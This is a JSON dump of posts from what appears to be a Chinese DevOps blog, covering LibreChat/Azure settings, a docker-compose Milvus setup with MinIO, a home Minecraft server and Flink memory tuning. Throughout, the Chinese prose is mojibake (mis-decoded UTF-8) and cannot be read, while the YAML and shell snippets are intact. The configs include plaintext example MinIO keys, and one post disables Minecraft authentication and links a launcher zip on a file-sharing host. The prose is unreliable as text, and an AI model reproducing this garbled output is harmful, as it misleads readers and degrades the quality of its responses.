class=\"s2\"\u003e\u0026#34;2024-02-15-preview\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢çš„é…ç½®æ˜¯é—®äº†geminiç»™å‡ºçš„ï¼Œçœ‹å¾—å‡ºæ¥å˜é‡AZURE_OPENAI_API_BASEä¸­çš„xxx.openai.azure.comå‰é¢çš„xxxï¼Œå°±æ˜¯instanceName\u003c/p\u003e\n\u003cp\u003eOPENAI_API_KEYå°±æ˜¯apiKey\u003c/p\u003e\n\u003cp\u003eAZURE_OPENAI_DEPLOYMENT_NAMEå°±æ˜¯deploymentName\u003c/p\u003e\n\u003cp\u003eæ¨¡å‹çš„gpt-4oè¿˜æœ‰gpt-4-turbo-2024-04-09éƒ½æ˜¯geiminiç»™å‡ºçš„ï¼Œversionä¹Ÿå¾ˆé‡è¦ï¼Œä¸å¯¹ä¼šæŠ¥é”™\u003c/p\u003e\n\u003cp\u003eç„¶åå°±å¯ä»¥äº†\u003c/p\u003e","title":"LibreChatå¦‚ä½•é…ç½®æ¥å…¥Azure"},{"content":"Milvus æ˜¯ä¸ªå‘é‡æ•°æ®åº“ï¼Œå¯ä»¥åœ¨kubernetesé‡Œæ­å»ºï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å‡ºæ¥æ­å»º\nhelmçš„æ–¹å¼å…ˆä¸è¯´ï¼Œç”¨docker-composeç‹¬ç«‹æ­å»ºçš„æ—¶å€™ï¼Œå±…ç„¶è‡ªå·±è·‘äº†etcdå’Œminioï¼Œè¿˜å¤§æ‘‡å¤§æ‘†çš„æŠŠminioç»™æš´æ¼äº†å‡ºæ¥ï¼Œminioçš„å¯†ç å¤ªç®€é™‹äº†ï¼Œæ”¾åœ¨ç”Ÿäº§æ˜¯è‚¯å®šä¸è¡Œçš„ã€‚\né‚£ç”Ÿäº§æ­å»ºçš„å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼Œå¯ä»¥æŠŠminioçš„9091ç«¯å£ä¹Ÿç»™å–æ¶ˆäº†ï¼š\nä¸€ã€å‡†å¤‡å¥½docker-compose.ymlæ–‡ä»¶\nservices: etcd: container_name: milvus-etcd image: quay.io/coreos/etcd:v3.5.18 environment: - ETCD_AUTO_COMPACTION_MODE=revision - ETCD_AUTO_COMPACTION_RETENTION=1000 - ETCD_QUOTA_BACKEND_BYTES=4294967296 - ETCD_SNAPSHOT_COUNT=50000 volumes: - ${DOCKER_VOLUME_DIRECTORY:-.}/volumes/etcd:/etcd command: etcd -advertise-client-urls=http://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd restart: unless-stopped healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;etcdctl\u0026#34;, \u0026#34;endpoint\u0026#34;, \u0026#34;health\u0026#34;] interval: 30s timeout: 20s retries: 3 minio: container_name: milvus-minio image: minio/minio:RELEASE.2024-12-18T13-15-44Z environment: MINIO_ACCESS_KEY: rendoumi MINIO_SECRET_KEY: 12345abcde volumes: - ${DOCKER_VOLUME_DIRECTORY:-.}/volumes/minio:/minio_data command: minio server /minio_data --console-address \u0026#34;:9001\u0026#34; restart: unless-stopped healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;http://localhost:9000/minio/health/live\u0026#34;] interval: 30s timeout: 20s retries: 3 standalone: container_name: milvus-standalone image: milvusdb/milvus:v2.6.0 command: [\u0026#34;milvus\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;standalone\u0026#34;] restart: unless-stopped security_opt: - seccomp:unconfined environment: ETCD_ENDPOINTS: etcd:2379 MINIO_ADDRESS: minio:9000 MQ_TYPE: woodpecker volumes: - ${DOCKER_VOLUME_DIRECTORY:-.}/volumes/milvus:/var/lib/milvus healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;http://localhost:9091/healthz\u0026#34;] interval: 30s start_period: 90s timeout: 20s retries: 3 ports: - \u0026#34;19530:19530\u0026#34; depends_on: - \u0026#34;etcd\u0026#34; - \u0026#34;minio\u0026#34; networks: default: name: milvus æ³¨æ„ä¸Šé¢çš„æ–‡ä»¶ï¼ŒMINIO_ACCESS_KEYå’ŒMINIO_SECRET_KEYå·²ç»è¢«æ”¹æ‰äº†ã€‚\näºŒã€æ›¿æ¢ä¸å®‰å…¨çš„æ–‡ä»¶\nå¦‚ä¸Šï¼Œè¿è¡Œ docker compose up -dï¼Œå°±ä¼šå¯åŠ¨ï¼Œä½†æ˜¯è¿™ä¼šå„¿milvuså¯åŠ¨æ˜¯æŠ¥é”™çš„ï¼Œå› ä¸ºminioçš„ç¼ºçœå¯†ç å˜äº†ï¼Œæ²¡æ³•æ­£ç¡®è¿æ¥ä¸Šã€‚\næˆ‘ä»¬é¦–å…ˆæŠŠé…ç½®æ–‡ä»¶æ‹·è´å‡ºæ¥\ndocker cp milvus-standalone:/milvus/configs/milvus.yaml milvus.yaml ä¿®æ”¹minioéƒ¨åˆ†ä¸­çš„IDå’ŒKey\nç„¶åä¿®æ”¹ docker-compose.yml ï¼ŒæŠŠæ–‡ä»¶å†æŒ‚è¿›å»\næœ€åè¿è¡Œï¼š\ndocker compose up -d å°±å¯ä»¥äº†\næœ€åçš„æœ€åè¿è¡Œä¸ªATTUè¿›è¡Œç®¡ç†å§ï¼š\ndocker run -d --name attu -p 8000:3000 -e ATTU_LOG_LEVEL=info -e MILVUS_URL=192.168.1.100:19530 zilliz/attu:v2.6 ","permalink":"https://rendoumi.com/posts/20251203-milvus_install/","summary":"\u003cp\u003eMilvus æ˜¯ä¸ªå‘é‡æ•°æ®åº“ï¼Œå¯ä»¥åœ¨kubernetesé‡Œæ­å»ºï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å‡ºæ¥æ­å»º\u003c/p\u003e\n\u003cp\u003ehelmçš„æ–¹å¼å…ˆä¸è¯´ï¼Œç”¨docker-composeç‹¬ç«‹æ­å»ºçš„æ—¶å€™ï¼Œå±…ç„¶è‡ªå·±è·‘äº†etcdå’Œminioï¼Œè¿˜å¤§æ‘‡å¤§æ‘†çš„æŠŠminioç»™æš´æ¼äº†å‡ºæ¥ï¼Œminioçš„å¯†ç å¤ªç®€é™‹äº†ï¼Œæ”¾åœ¨ç”Ÿäº§æ˜¯è‚¯å®šä¸è¡Œçš„ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ç”Ÿäº§æ­å»ºçš„å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼Œå¯ä»¥æŠŠminioçš„9091ç«¯å£ä¹Ÿç»™å–æ¶ˆäº†ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€å‡†å¤‡å¥½docker-compose.ymlæ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  etcd:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: milvus-etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: quay.io/coreos/etcd:v3.5.18\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_AUTO_COMPACTION_MODE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003erevision\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_AUTO_COMPACTION_RETENTION\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_QUOTA_BACKEND_BYTES\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4294967296\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"nv\"\u003eETCD_SNAPSHOT_COUNT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e50000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOCKER_VOLUME_DIRECTORY\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e/volumes/etcd:/etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: etcd -advertise-client-urls\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    healthcheck:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      test: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CMD\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;etcdctl\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;endpoint\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;health\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      interval: 30s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      timeout: 20s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      retries: \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  minio:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: milvus-minio\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: minio/minio:RELEASE.2024-12-18T13-15-44Z\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MINIO_ACCESS_KEY: rendoumi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MINIO_SECRET_KEY: 12345abcde\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOCKER_VOLUME_DIRECTORY\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e/volumes/minio:/minio_data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: minio server /minio_data --console-address \u003cspan class=\"s2\"\u003e\u0026#34;:9001\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    healthcheck:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      test: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CMD\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;curl\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-f\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;http://localhost:9000/minio/health/live\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      interval: 30s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      timeout: 20s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      retries: \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  standalone:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: milvus-standalone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: milvusdb/milvus:v2.6.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;milvus\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;run\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;standalone\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    restart: unless-stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    security_opt:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - seccomp:unconfined\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      ETCD_ENDPOINTS: etcd:2379\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MINIO_ADDRESS: minio:9000\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      MQ_TYPE: woodpecker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOCKER_VOLUME_DIRECTORY\u003c/span\u003e\u003cspan class=\"k\"\u003e:-\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e/volumes/milvus:/var/lib/milvus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    healthcheck:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      test: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;CMD\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;curl\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-f\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;http://localhost:9091/healthz\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      interval: 30s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      start_period: 90s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      timeout: 20s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      retries: \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;19530:19530\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;etcd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;minio\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetworks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  default:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    name: milvus\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢çš„æ–‡ä»¶ï¼ŒMINIO_ACCESS_KEYå’ŒMINIO_SECRET_KEYå·²ç»è¢«æ”¹æ‰äº†ã€‚\u003c/p\u003e","title":"Milvusç”Ÿäº§ç¯å¢ƒæ­å»º"},{"content":"å„¿å­å¤©å¤©ç©minecraftç©å¾—ä¸äº¦ä¹ä¹ï¼Œå°±æƒ³è‡ªå·±æ­ä¸ªæœåŠ¡å™¨ï¼Œç„¶åå½“å®¶åšä¸»äºº\näºæ˜¯ä¹ï¼Œé‚£å°±æ­ä¸ªå§ï¼Œæ²¡æƒ³åˆ°è¿˜çœŸä¸å¤ªå®¹æ˜“ï¼Œ\næ‰¾åˆ°ä¸ªç½‘ç«™ï¼šhttps://docker-minecraft-server.readthedocs.io/en/latest/\nç”¨docker runå§æ­»æ´»è·‘ä¸èµ·æ¥ï¼Œå¤§æ— è¯­\næ”¹ç”¨docker composeå°±ä¸€ä¸‹èµ·æ¥äº†ï¼š\ndocker-compose.yaml\nservices: mc: image: itzg/minecraft-server:latest pull_policy: always tty: true stdin_open: true ports: - \u0026#34;25565:25565\u0026#34; environment: EULA: \u0026#34;TRUE\u0026#34; volumes: # attach the relative directory \u0026#39;data\u0026#39; to the container\u0026#39;s /data path - ./data:/data æ³¨æ„ï¼šå…³é”®çš„ä¸€æ­¥æ¥äº†ï¼Œå¯åŠ¨åï¼Œåˆ°docker composeçš„å½“å‰ç›®å½•\nvi data/server.properties online-mode=false å¦åˆ™å®¢æˆ·ç«¯æ— æ³•è”ä¸ŠæœåŠ¡å™¨ã€‚\né‚£å®¢æˆ·ç«¯å‘¢ï¼Œç›´æ¥ä¸‹è½½è¿™ä¸ªå¯åŠ¨å™¨ï¼Œç„¶åä¸ç”¨ä¸‹è½½ä»»ä½•javaçš„ä¸œè¥¿\nhttps://webstatic.ctfile.com/assets/download/url94.ctfile.com/008854/HMCL-3.7.3.zip æ‰“å¼€åä¼šè‡ªåŠ¨ä¸‹è½½javaå’Œå®¢æˆ·ç«¯ï¼Œç„¶åè¿æ¥æœåŠ¡å™¨çš„25565ç«¯å£ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20251124-minecraft/","summary":"\u003cp\u003eå„¿å­å¤©å¤©ç©minecraftç©å¾—ä¸äº¦ä¹ä¹ï¼Œå°±æƒ³è‡ªå·±æ­ä¸ªæœåŠ¡å™¨ï¼Œç„¶åå½“å®¶åšä¸»äºº\u003c/p\u003e\n\u003cp\u003eäºæ˜¯ä¹ï¼Œé‚£å°±æ­ä¸ªå§ï¼Œæ²¡æƒ³åˆ°è¿˜çœŸä¸å¤ªå®¹æ˜“ï¼Œ\u003c/p\u003e\n\u003cp\u003eæ‰¾åˆ°ä¸ªç½‘ç«™ï¼šhttps://docker-minecraft-server.readthedocs.io/en/latest/\u003c/p\u003e\n\u003cp\u003eç”¨docker runå§æ­»æ´»è·‘ä¸èµ·æ¥ï¼Œå¤§æ— è¯­\u003c/p\u003e\n\u003cp\u003eæ”¹ç”¨docker composeå°±ä¸€ä¸‹èµ·æ¥äº†ï¼š\u003c/p\u003e\n\u003cp\u003edocker-compose.yaml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  mc:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: itzg/minecraft-server:latest\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    pull_policy: always\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    tty: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    stdin_open: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - \u003cspan class=\"s2\"\u003e\u0026#34;25565:25565\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      EULA: \u003cspan class=\"s2\"\u003e\u0026#34;TRUE\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# attach the relative directory \u0026#39;data\u0026#39; to the container\u0026#39;s /data path\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - ./data:/data\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼šå…³é”®çš„ä¸€æ­¥æ¥äº†ï¼Œå¯åŠ¨åï¼Œåˆ°docker composeçš„å½“å‰ç›®å½•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi data/server.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eonline-mode\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦åˆ™å®¢æˆ·ç«¯æ— æ³•è”ä¸ŠæœåŠ¡å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å®¢æˆ·ç«¯å‘¢ï¼Œç›´æ¥ä¸‹è½½è¿™ä¸ªå¯åŠ¨å™¨ï¼Œç„¶åä¸ç”¨ä¸‹è½½ä»»ä½•javaçš„ä¸œè¥¿\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://webstatic.ctfile.com/assets/download/url94.ctfile.com/008854/HMCL-3.7.3.zip\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ‰“å¼€åä¼šè‡ªåŠ¨ä¸‹è½½javaå’Œå®¢æˆ·ç«¯ï¼Œç„¶åè¿æ¥æœåŠ¡å™¨çš„25565ç«¯å£ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚\u003c/p\u003e","title":"Minecraftè‡ªå»ºæœåŠ¡å™¨çš„æ­å»º"},{"content":"ç”Ÿäº§ç¯å¢ƒç”¨åˆ°äº†Flinkï¼Œé‚£å…¶å®æ— è®ºè…¾è®¯çš„flinkè¿˜æ˜¯awsçš„flinkï¼Œéƒ½æ˜¯è¿è¡Œåœ¨å®¹å™¨ä¸­çš„\næ‰€ä»¥æˆ‘ä»¬è‡ªå»ºï¼Œä¹Ÿç”¨å®¹å™¨ï¼Œdocker-compose.yamlä¸€æŠŠæ¢­\nservices: jobmanager: image: flink:1.17.1 ports: - \u0026#34;8081:8081\u0026#34; command: jobmanager environment: - | FLINK_PROPERTIES= jobmanager.memory.process.size: 4gb jobmanager.rpc.address: jobmanager taskmanager: image: flink:1.17.1 depends_on: - jobmanager command: taskmanager environment: - | FLINK_PROPERTIES= taskmanager.numberOfTaskSlots: 1 taskmanager.memory.process.size: 8gb jobmanager.rpc.address: jobmanager deploy: replicas: 1 æ³¨æ„å•Šï¼Œä¸Šé¢èŠ‚ç‚¹æ˜¯16GBå†…å­˜ï¼Œæ‰€ä»¥jobåˆ†äº†4Gï¼Œç„¶åtaskç»™äº†8Gï¼ŒTaskSlotç»™äº†1ï¼Œå‰¯æœ¬ä¹Ÿæ˜¯1ã€‚å†…å­˜å¯Œè£•4Gã€‚æ˜¯è¿™ä¹ˆç®—çš„\næˆ‘ä»¬å†çœ‹ä¸€ä¸ªé…ç½®ï¼Œæ˜¯æµ‹è¯•ç¯å¢ƒçš„ï¼ŒèŠ‚ç‚¹æ˜¯32Gï¼š\nservices: jobmanager: image: flink:1.17.1 ports: - \u0026#34;8081:8081\u0026#34; command: jobmanager environment: - | FLINK_PROPERTIES= jobmanager.memory.process.size: 2gb jobmanager.rpc.address: jobmanager taskmanager: image: flink:1.17.1 depends_on: - jobmanager command: taskmanager environment: - | FLINK_PROPERTIES= taskmanager.numberOfTaskSlots: 4 taskmanager.memory.process.size: 8gb jobmanager.rpc.address: jobmanager deploy: replicas: 1 æµ‹è¯•ç¯å¢ƒçš„å†…å­˜å°±å›§å¤šäº†ï¼Œjobmanageråªç»™äº†2Gï¼Œä½†æ˜¯ä»»åŠ¡å¤šä¸”å¤§ï¼Œ8Gå’ŒSlotç»™äº†4ï¼Œè¿™ä¸ªå€¼æ˜¯ä¸æ–­å¤±è´¥ç„¶åä¿®æ”¹å¾—åˆ°çš„\næˆ‘ä»¬ä¸Šç”Ÿäº§çš„æ—¶å€™è¦æ 